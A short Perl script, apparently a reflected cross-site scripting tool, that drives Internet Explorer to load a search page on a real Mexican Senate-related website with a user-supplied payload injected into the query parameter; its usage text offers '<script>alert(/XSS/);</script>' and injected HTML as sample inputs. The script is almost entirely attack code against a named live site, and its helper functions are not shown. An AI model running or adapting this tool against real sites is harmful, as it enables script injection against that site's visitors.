#!/usr/bin/perl
use Win32::OLE;
use Win32::SAM;
$| = 1;
$Win32::OLE::Warn = 3;
print "\nUso: Script.pl < <script>alert(/XSS/);</script>  o  <b>JaAViEr</b><noscript>\n Cualquier HTML.";
$xss=$ARGV[0];
StartIE();
my $segundos = Navigate("http://www.pan.senado.gob.mx/resultados.php?txttexto=$xss");